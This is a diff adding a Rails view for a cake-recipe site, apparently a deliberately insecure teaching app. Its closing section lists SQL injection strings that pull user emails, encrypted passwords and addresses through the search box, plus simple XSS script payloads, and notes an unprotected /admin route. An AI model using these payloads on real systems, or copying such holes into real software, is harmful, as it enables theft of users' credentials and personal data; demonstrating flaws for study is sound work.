@@ -1,0 +1,76 @@
+<p style="color: green"><%= notice %></p>
+
+<h1>Cake Recipes</h1>
+<p>These recipes have been uploaded by our best bakers.<br>Here you can enjoy making and reading about different type of desserts and drinks that can go with them
+</p>
+
+<header class="bg-primary-gradient">
+  <section class="clean-block clean-post dark" >
+    <h1 class="text-center" style="padding-top: 2%;">Search for the recipes</h1>
+    <div class="container" >
+      <h2 class="text-center">Look for a recipes Name or contexts</h2>
+      <div class="block-content">
+        <div class="post-body ">
+          <div class="search" style="margin: 3%; text-align: center;">
+            <%= form_tag posts_path, method: :get do %>
+              <%= text_field_tag name="post[query]", '', size:100 %>
+              <%= submit_tag 'Search' %>
+            <% end %>
+          </div>
+          <hr />
+          <br />
+        </div>
+      </div>
+    </div>
+  </section>
+</header>
+
+
+
+<div id="posts">
+  <div class="col mb-5" style="padding:18px;">
+    <% @posts.each do |post| %>
+      <div class="card shadow-sm mb-4">
+        <div class="card-body px-4 py-5 px-md-5" style="background-color:lightgrey; border-radius: 20px">
+          <%= render post %>
+          <p>
+            <%= link_to "Show this post", post %>
+          </p>
+        </div>
+      </div>
+    <% end %>
+  </div>
+</div>
+
+<a href="posts/new">Create A New Recipes</a>
+
+
+
+<hr>
+<h1>Info About Insecure and Secure App</h1>
+<p>Here I intentionally made the button look out dated to show a security flaws. This is the insecure
+  site so it will look differnt than to the secure site where the layout and looks are being validated
+  and are using proper buttons such as primary and secondary buttons.
+  naming conventions have stayed the same to be able to compare between the code
+  only difference is the body is called content on the insecure app while its called context on the secure
+  one
+  There are no
+authentication between sites like going to /admin on the url.
+
+</p>
+<hr>
+<h1>SQL Inject the Search button using the commands!</h1>
+<p><strong>This will display the email and password:</strong><br>Cake') union select 1, email, encrypted_password, null, null, true from users --</p>
+<p><strong>This will display  the email and address:</strong><br>Cake') union select 1, email, address, null, null, true from users --</p>
+<p><strong>This will display  the email, password and users that are Admin:</strong><br>Cake') union select 1, email, encrypted_password, null, null, true from users where admin = true --</p>
+<p><strong>This will display  private posts:</strong><br>Cake' or 1=1)</p>
+<hr>
+<h1>XSS the subscribe button in the Home page using the command!</h1>
+<p><strong>This will inject an alert script:</strong><br>&lt;script&gt;alert('XSS Attack')&lt;/script&gt;</p>
+<p><strong>This will run a script to change the css properties
+  (background color to red):</strong>
+  <br>&lt;script&gt;function changeBackground(color) {
+  document.body.style.background = color;
+  } window.addEventListener("load",function() {
+  changeBackground('red') });&lt;/script&gt;</p>
+
